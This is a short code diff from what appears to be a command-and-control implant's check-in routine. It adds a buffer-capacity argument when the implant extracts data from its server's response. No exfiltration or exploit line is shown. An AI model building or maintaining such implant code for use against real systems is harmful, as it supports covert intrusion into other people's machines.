@@ -1819,7 +1819,8 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
             if (extracted) {
                 DWORD extracted_len = 0;
                 DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
-                                                          extracted, &extracted_len);
+                                                          extracted, extracted_cap,
+                                                          &extracted_len);
                 if (extract_ret > 0 && extracted_len > 0) {
                     COMMS_TRACE("[SPECTER] checkin: profile response extracted");
                     resp_plain = (BYTE *)heap_alloc_cached(resp_plain_cap);
